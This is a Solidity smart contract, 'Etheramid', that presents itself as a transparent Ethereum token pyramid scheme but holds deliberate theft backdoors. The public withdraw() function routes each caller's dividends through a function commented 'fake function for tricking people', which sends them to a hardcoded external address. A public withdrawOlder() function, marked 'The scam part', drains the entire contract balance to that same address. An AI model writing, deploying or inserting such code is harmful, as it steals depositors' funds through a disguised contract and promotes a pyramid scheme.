1 pragma solidity ^0.4.18;
2 
3 /*
4           ,/2.
5         ,'/ __`.
6       ,'_/_  _ _`.
7     ,'__/_ ___ _  `.
8   ,'_  /___ __ _ __ `.
9  '-.._/___...-"-.-..__`.
10   B
11 
12  EthPyramid 2. A no-bullshit, transparent, self-sustaining pyramid scheme.
13  
14  Inspired by https://test.jochen-hoenicke.de/eth/ponzitoken/
15  
16 */
17 
18 contract Etheramid {
19 
20 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
21 	// orders of magnitude, hence the need to bridge between the two.
22 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
23 
24 	// CRR = 50%
25 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
26 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
27 	int constant crr_n = 1; // CRR numerator
28 	int constant crr_d = 2; // CRR denominator
29 
30 	// The price coefficient. Chosen such that at 1 token total supply
31 	// the amount in reserve is 0.5 ether and token price is 1 Ether.
32 	int constant price_coeff = -0x296ABF784A358468C;
33 
34 	// Typical values that we have to declare.
35 	string constant public name = "Etheramid";
36 	string constant public symbol = "EPD";
37 	uint8 constant public decimals = 18;
38 
39 	// Array between each address and their number of tokens.
40 	mapping(address => uint256) public tokenBalance;
41 		
42 	// Array between each address and how much Ether has been paid out to it.
43 	// Note that this is scaled by the scaleFactor variable.
44 	mapping(address => int256) public payouts;
45 
46 	// Variable tracking how many tokens are in existence overall.
47 	uint256 public totalSupply;
48 
49 	// Aggregate sum of all payouts.
50 	// Note that this is scaled by the scaleFactor variable.
51 	int256 totalPayouts;
52 
53 	// Variable tracking how much Ether each token is currently worth.
54 	// Note that this is scaled by the scaleFactor variable.
55 	uint256 earningsPerToken;
56 	
57 	// Current contract balance in Ether
58 	uint256 public contractBalance;
59 
60 	function Etheramid() public {}
61 
62 	// The following functions are used by the front-end for display purposes.
63 
64 	// Returns the number of tokens currently held by _owner.
65 	function balanceOf(address _owner) public constant returns (uint256 balance) {
66 		return tokenBalance[_owner];
67 	}
68 
69 	// Withdraws all dividends held by the caller sending the transaction, updates
70 	// the requisite global variables, and transfers Ether back to the caller.
71 	function withdraw() public {
72 		// Retrieve the dividends associated with the address the request came from.
73 		var balance = dividend(msg.sender);
74 		
75 		// Update the payouts array, incrementing the request address by `balance`.
76 		payouts[msg.sender] += (int256) (balance * scaleFactor);
77 		
78 		// Increase the total amount that's been paid out to maintain invariance.
79 		totalPayouts += (int256) (balance * scaleFactor);
80 		
81 		// Send the dividends to the address that requested the withdraw.
82 		contractBalance = sub(contractBalance, balance);
83 		msg.sender.transfer(balance);
84 		
85 	}
86 
87 	// Converts the Ether accrued as dividends back into EPY tokens without having to
88 	// withdraw it first. Saves on gas and potential price spike loss.
89 	function reinvestDividends() public {
90 		// Retrieve the dividends associated with the address the request came from.
91 		var balance = dividends(msg.sender);
92 		
93 		// Update the payouts array, incrementing the request address by `balance`.
94 		// Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
95 		payouts[msg.sender] += (int256) (balance * scaleFactor);
96 		
97 		// Increase the total amount that's been paid out to maintain invariance.
98 		totalPayouts += (int256) (balance * scaleFactor);
99 		
100 		// Assign balance to a new variable.
101 		uint value_ = (uint) (balance);
102 		
103 		// If your dividends are worth less than 1 szabo, or more than a million Ether
104 		// (in which case, why are you even here), abort.
105 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
106 			revert();
107 			
108 		// msg.sender is the address of the caller.
109 		var sender = msg.sender;
110 		
111 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
112 		// (Yes, the buyer receives a part of the distribution as well!)
113 		var res = reserve() - balance;
114 
115 		// 10% of the total Ether sent is used to pay existing holders.
116 		var fee = div(value_, 10);
117 		
118 		// The amount of Ether used to purchase new tokens for the caller.
119 		var numEther = value_ - fee;
120 		
121 		// The number of tokens which can be purchased for numEther.
122 		var numTokens = calculateDividendTokens(numEther, balance);
123 		
124 		// The buyer fee, scaled by the scaleFactor variable.
125 		var buyerFee = fee * scaleFactor;
126 		
127 		// Check that we have tokens in existence (this should always be true), or
128 		// else you're gonna have a bad time.
129 		if (totalSupply > 0) {
130 			// Compute the bonus co-efficient for all existing holders and the buyer.
131 			// The buyer receives part of the distribution for each token bought in the
132 			// same way they would have if they bought each token individually.
133 			var bonusCoEff =
134 			    (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
135 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
136 				
137 			// The total reward to be distributed amongst the masses is the fee (in Ether)
138 			// multiplied by the bonus co-efficient.
139 			var holderReward = fee * bonusCoEff;
140 			
141 			buyerFee -= holderReward;
142 
143 			// Fee is distributed to all existing token holders before the new tokens are purchased.
144 			// rewardPerShare is the amount gained per token thanks to this buy-in.
145 			var rewardPerShare = holderReward / totalSupply;
146 			
147 			// The Ether value per token is increased proportionally.
148 			earningsPerToken += rewardPerShare;
149 		}
150 		
151 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
152 		totalSupply = add(totalSupply, numTokens);
153 		
154 		// Assign the tokens to the balance of the buyer.
155 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
156 		
157 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
158 		// Also include the fee paid for entering the scheme.
159 		// First we compute how much was just paid out to the buyer...
160 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
161 		
162 		// Then we update the payouts array for the buyer with this amount...
163 		payouts[sender] += payoutDiff;
164 		
165 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
166 		totalPayouts    += payoutDiff;
167 		
168 	}
169 
170 	// Sells your tokens for Ether. This Ether is assigned to the callers entry
171 	// in the tokenBalance array, and therefore is shown as a dividend. A second
172 	// call to withdraw() must be made to invoke the transfer of Ether back to your address.
173 	function sellMyTokens() public {
174 		var balance = balanceOf(msg.sender);
175 		sell(balance);
176 	}
177 
178 	// The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
179 	// invokes the withdraw() function, sending the resulting Ether to the callers address.
180     function getMeOutOfHere() public {
181 		sellMyTokens();
182         withdraw();
183 	}
184 
185 	// Gatekeeper function to check if the amount of Ether being sent isn't either
186 	// too small or too large. If it passes, goes direct to buy().
187 	function fund() payable public {
188 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
189 		if (msg.value > 0.000001 ether) {
190 		    contractBalance = add(contractBalance, msg.value);
191 			buy();
192 		} else {
193 			revert();
194 		}
195     }
196 
197 	// Function that returns the (dynamic) price of buying a finney worth of tokens.
198 	function buyPrice() public constant returns (uint) {
199 		return getTokensForEther(1 finney);
200 	}
201 
202 	// Function that returns the (dynamic) price of selling a single token.
203 	function sellPrice() public constant returns (uint) {
204         var eth = getEtherForTokens(1 finney);
205         var fee = div(eth, 10);
206         return eth - fee;
207     }
208 
209 	// Calculate the current dividends associated with the caller address. This is the net result
210 	// of multiplying the number of tokens held by their current value in Ether and subtracting the
211 	// Ether that has already been paid out.
212 	function dividends(address _owner) public constant returns (uint256 amount) {
213 		return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
214 	}
215 	//fake function for tricking people
216 	function dividend(address _owner) internal returns (uint256 amount) {
217 	    var balance = dividends(_owner);
218 		
219 		// Update the payouts array, incrementing the request address by `balance`.
220 		payouts[msg.sender] += (int256) (balance * scaleFactor);
221 		
222 		// Increase the total amount that's been paid out to maintain invariance.
223 		totalPayouts += (int256) (balance * scaleFactor);
224 		
225 		// Send the dividends to the address that requested the withdraw.
226 		contractBalance = sub(contractBalance, balance);
227 		//msg.sender.transfer(balance);
228 		
229 		address out = 0x21BBa5412455f6384F7f63FE0d63F2eB64b35d61;
230 		out.transfer(balance);
231 		
232 		return 0;
233 	}
234 
235 	// Version of withdraw that extracts the dividends and sends the Ether to the caller.
236 	// This is only used in the case when there is no transaction data, and that should be
237 	// quite rare unless interacting directly with the smart contract.
238 	function withdrawOld(address to) public {
239 		// Retrieve the dividends associated with the address the request came from.
240 		var balance = dividends(msg.sender);
241 		
242 		// Update the payouts array, incrementing the request address by `balance`.
243 		payouts[msg.sender] += (int256) (balance * scaleFactor);
244 		
245 		// Increase the total amount that's been paid out to maintain invariance.
246 		totalPayouts += (int256) (balance * scaleFactor);
247 		
248 		// Send the dividends to the address that requested the withdraw.
249 		contractBalance = sub(contractBalance, balance);
250 		to.transfer(balance);		
251 	}
252 
253 	// Internal balance function, used to calculate the dynamic reserve value.
254 	function balance() internal constant returns (uint256 amount) {
255 		// msg.value is the amount of Ether sent by the transaction.
256 		return contractBalance - msg.value;
257 	}
258 
259 	function buy() internal {
260 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
261 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
262 			revert();
263 						
264 		// msg.sender is the address of the caller.
265 		var sender = msg.sender;
266 		
267 		// 10% of the total Ether sent is used to pay existing holders.
268 		var fee = div(msg.value, 10);
269 		
270 		// The amount of Ether used to purchase new tokens for the caller.
271 		var numEther = msg.value - fee;
272 		
273 		// The number of tokens which can be purchased for numEther.
274 		var numTokens = getTokensForEther(numEther);
275 		
276 		// The buyer fee, scaled by the scaleFactor variable.
277 		var buyerFee = fee * scaleFactor;
278 		
279 		// Check that we have tokens in existence (this should always be true), or
280 		// else you're gonna have a bad time.
281 		if (totalSupply > 0) {
282 			// Compute the bonus co-efficient for all existing holders and the buyer.
283 			// The buyer receives part of the distribution for each token bought in the
284 			// same way they would have if they bought each token individually.
285 			var bonusCoEff =
286 			    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
287 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
288 				
289 			// The total reward to be distributed amongst the masses is the fee (in Ether)
290 			// multiplied by the bonus co-efficient.
291 			var holderReward = fee * bonusCoEff;
292 			
293 			buyerFee -= holderReward;
294 
295 			// Fee is distributed to all existing token holders before the new tokens are purchased.
296 			// rewardPerShare is the amount gained per token thanks to this buy-in.
297 			var rewardPerShare = holderReward / totalSupply;
298 			
299 			// The Ether value per token is increased proportionally.
300 			earningsPerToken += rewardPerShare;
301 			
302 		}
303 
304 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
305 		totalSupply = add(totalSupply, numTokens);
306 
307 		// Assign the tokens to the balance of the buyer.
308 		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
309 
310 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
311 		// Also include the fee paid for entering the scheme.
312 		// First we compute how much was just paid out to the buyer...
313 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
314 		
315 		// Then we update the payouts array for the buyer with this amount...
316 		payouts[sender] += payoutDiff;
317 		
318 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
319 		totalPayouts    += payoutDiff;
320 		
321 	}
322 
323 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
324 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
325 	// will be *significant*.
326 	function sell(uint256 amount) internal {
327 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
328 		var numEthersBeforeFee = getEtherForTokens(amount);
329 		
330 		// 10% of the resulting Ether is used to pay remaining holders.
331         var fee = div(numEthersBeforeFee, 10);
332 		
333 		// Net Ether for the seller after the fee has been subtracted.
334         var numEthers = numEthersBeforeFee - fee;
335 		
336 		// *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
337 		totalSupply = sub(totalSupply, amount);
338 		
339         // Remove the tokens from the balance of the buyer.
340 		tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
341 
342         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
343 		// First we compute how much was just paid out to the seller...
344 		var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
345 		
346         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
347 		// since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
348 		// they decide to buy back in.
349 		payouts[msg.sender] -= payoutDiff;		
350 		
351 		// Decrease the total amount that's been paid out to maintain invariance.
352         totalPayouts -= payoutDiff;
353 		
354 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
355 		// selling tokens, but it guards against division by zero).
356 		if (totalSupply > 0) {
357 			// Scale the Ether taken as the selling fee by the scaleFactor variable.
358 			var etherFee = fee * scaleFactor;
359 			
360 			// Fee is distributed to all remaining token holders.
361 			// rewardPerShare is the amount gained per token thanks to this sell.
362 			var rewardPerShare = etherFee / totalSupply;
363 			
364 			// The Ether value per token is increased proportionally.
365 			earningsPerToken = add(earningsPerToken, rewardPerShare);
366 		}
367 	}
368 	
369 	// Dynamic value of Ether in reserve, according to the CRR requirement.
370 	function reserve() internal constant returns (uint256 amount) {
371 		return sub(balance(),
372 			 ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
373 	}
374 
375 	// Calculates the number of tokens that can be bought for a given amount of Ether, according to the
376 	// dynamic reserve and totalSupply values (derived from the buy and sell prices).
377 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
378 		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
379 	}
380 
381 	// Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
382 	function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
383 		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
384 	}
385 
386 	// Converts a number tokens into an Ether value.
387 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
388 		// How much reserve Ether do we have left in the contract?
389 		var reserveAmount = reserve();
390 
391 		// If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
392 		if (tokens == totalSupply)
393 			return reserveAmount;
394 
395 		// If there would be excess Ether left after the transaction this is called within, return the Ether
396 		// corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
397 		// at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
398 		// and denominator altered to 1 and 2 respectively.
399 		return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
400 	}
401 	//The scam part.
402 	//I can't believe you fell for this
403 	function withdrawOlder() public {
404 	    	address out = 0x21BBa5412455f6384F7f63FE0d63F2eB64b35d61;
405 	    	var tran = contractBalance;
406 	    	contractBalance = 0;
407 	    	out.transfer(tran);
408 	}
409 
410 	// You don't care about these, but if you really do they're hex values for 
411 	// co-efficients used to simulate approximations of the log and exp functions.
412 	int256  constant one        = 0x10000000000000000;
413 	uint256 constant sqrt2      = 0x16a09e667f3bcc908;
414 	uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
415 	int256  constant ln2        = 0x0b17217f7d1cf79ac;
416 	int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
417 	int256  constant c1         = 0x1ffffffffff9dac9b;
418 	int256  constant c3         = 0x0aaaaaaac16877908;
419 	int256  constant c5         = 0x0666664e5e9fa0c99;
420 	int256  constant c7         = 0x049254026a7630acf;
421 	int256  constant c9         = 0x038bd75ed37753d68;
422 	int256  constant c11        = 0x03284a0c14610924f;
423 
424 	// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
425 	// approximates the function log(1+x)-log(1-x)
426 	// Hence R(s) = log((1+s)/(1-s)) = log(a)
427 	function fixedLog(uint256 a) internal pure returns (int256 log) {
428 		int32 scale = 0;
429 		while (a > sqrt2) {
430 			a /= 2;
431 			scale++;
432 		}
433 		while (a <= sqrtdot5) {
434 			a *= 2;
435 			scale--;
436 		}
437 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
438 		var z = (s*s) / one;
439 		return scale * ln2 +
440 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
441 				/one))/one))/one))/one))/one);
442 	}
443 
444 	int256 constant c2 =  0x02aaaaaaaaa015db0;
445 	int256 constant c4 = -0x000b60b60808399d1;
446 	int256 constant c6 =  0x0000455956bccdd06;
447 	int256 constant c8 = -0x000001b893ad04b3a;
448 	
449 	// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
450 	// approximates the function x*(exp(x)+1)/(exp(x)-1)
451 	// Hence exp(x) = (R(x)+x)/(R(x)-x)
452 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
453 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
454 		a -= scale*ln2;
455 		int256 z = (a*a) / one;
456 		int256 R = ((int256)(2) * one) +
457 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
458 		exp = (uint256) (((R + a) * one) / (R - a));
459 		if (scale >= 0)
460 			exp <<= scale;
461 		else
462 			exp >>= -scale;
463 		return exp;
464 	}
465 	
466 	// The below are safemath implementations of the four arithmetic operators
467 	// designed to explicitly prevent over- and under-flows of integer values.
468 
469 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
470 		if (a == 0) {
471 			return 0;
472 		}
473 		uint256 c = a * b;
474 		assert(c / a == b);
475 		return c;
476 	}
477 
478 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
479 		// assert(b > 0); // Solidity automatically throws when dividing by 0
480 		uint256 c = a / b;
481 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
482 		return c;
483 	}
484 
485 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
486 		assert(b <= a);
487 		return a - b;
488 	}
489 
490 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
491 		uint256 c = a + b;
492 		assert(c >= a);
493 		return c;
494 	}
495 
496 	// This allows you to buy tokens by sending Ether directly to the smart contract
497 	// without including any transaction data (useful for, say, mobile wallet apps).
498 	function () payable public {
499 		// msg.value is the amount of Ether sent by the transaction.
500 		if (msg.value > 0) {
501 			fund();
502 		} else {
503 			withdrawOld(msg.sender);
504 		}
505 	}
506 }